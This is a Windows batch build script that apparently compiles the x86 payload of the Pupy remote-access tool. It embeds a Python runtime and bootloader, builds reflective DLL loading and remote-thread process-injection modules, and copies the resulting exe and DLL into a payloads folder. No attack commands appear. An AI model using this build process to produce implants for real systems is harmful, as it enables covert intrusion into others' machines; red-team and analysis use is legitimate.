del *.obj
del *.exp
del pupyx86.exe
del pupyx86.dll

::First: generate resources :
copy resources\python27_x86.dll resources\python27.dll
"C:\\Python27\\python.exe" gen_library_compressed_string.py
copy resources\library_compressed_string_x86.txt resources\library_compressed_string.txt
"C:\\Python27\\python.exe" gen_resource_header.py resources\library_compressed_string.txt 
"C:\\Python27\\python.exe" gen_resource_header.py resources\python27.dll
"C:\\Python27\\python.exe" gen_python_bootloader.py
"C:\\Python27\\python.exe" gen_resource_header.py resources\bootloader.pyc
::compile them to obj files :
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c resources_library_compressed_string_txt.c
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c resources_bootloader_pyc.c
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c resources_python27_dll.c

::then compile

"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c Python-dynload.c /IC:\Python27\include
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c MemoryModule.c
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c _memimporter.c /IC:\Python27\include
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c pupy_load.c /DWIN_X86 /IC:\Python27\include
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c MyLoadLibrary.c /IC:\Python27\include
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /O2 /Ob1 /c ReflectiveLoader.c /DWIN_X86 -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN /DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c actctx.c
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c pupy.c /IC:\Python27\include
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c LoadLibraryR.c
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c list.c
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c thread.c
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c remote_thread.c
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" /c base_inject.c /IC:\Python27\include
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" main_exe.c _memimporter.obj MyLoadLibrary.obj Python-dynload.obj resources_bootloader_pyc.obj resources_python27_dll.obj MemoryModule.obj pupy_load.obj resources_library_compressed_string_txt.obj actctx.obj pupy.obj list.obj thread.obj remote_thread.obj LoadLibraryR.obj base_inject.obj /Fepupyx86.exe
"C:\Users\me\AppData\Local\Programs\Common\Microsoft\Visual C++ for Python\9.0\VC\Bin\cl.exe" main_reflective.c _memimporter.obj MyLoadLibrary.obj Python-dynload.obj resources_bootloader_pyc.obj resources_python27_dll.obj MemoryModule.obj pupy_load.obj ReflectiveLoader.obj resources_library_compressed_string_txt.obj actctx.obj pupy.obj list.obj thread.obj remote_thread.obj LoadLibraryR.obj base_inject.obj /Fepupyx86.dll /LD
copy pupyx86.dll ..\..\pupy\payloads\
copy pupyx86.exe ..\..\pupy\payloads\

